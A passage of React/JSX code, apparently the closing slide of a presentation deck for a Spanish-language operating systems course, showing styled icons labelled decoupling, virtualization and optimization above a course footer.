                <div style={{ textAlign: "center" }}>
                  <div
                    style={{
                      color: "var(--accent-buf)",
                      marginBottom: "0.5rem",
                    }}
                  >
                    <Layers size={40} />
                  </div>
                  <div
                    style={{
                      fontSize: "1rem",
                      opacity: 0.5,
                      fontFamily: "var(--mono)",
                    }}
                  >
                    DESACOPLAMIENTO
                  </div>
                </div>
                <div style={{ textAlign: "center" }}>
                  <div
                    style={{
                      color: "var(--accent-gold)",
                      marginBottom: "0.5rem",
                    }}
                  >
                    <RotateCcw size={40} />
                  </div>
                  <div
                    style={{
                      fontSize: "1rem",
                      opacity: 0.5,
                      fontFamily: "var(--mono)",
                    }}
                  >
                    VIRTUALIZACIÓN
                  </div>
                </div>
                <div style={{ textAlign: "center" }}>
                  <div
                    style={{
                      color: "var(--accent-cache)",
                      marginBottom: "0.5rem",
                    }}
                  >
                    <Activity size={40} />
                  </div>
                  <div
                    style={{
                      fontSize: "1rem",
                      opacity: 0.5,
                      fontFamily: "var(--mono)",
                    }}
                  >
                    OPTIMIZACIÓN
                  </div>
                </div>
              </div>

              <div
                style={{
                  borderTop: "1px solid var(--line)",
                  paddingTop: "3rem",
                  marginTop: "5rem",
                  opacity: 0.3,
                }}
              >
                <p style={{ fontSize: "1.2rem", fontFamily: "var(--mono)" }}>
                  CS-402 // SISTEMAS OPERATIVOS // 2026
                </p>
              </div>
            </motion.div>
          </div>
        </Slide>
        </Stack>
      </Deck>
    </>
  );
}
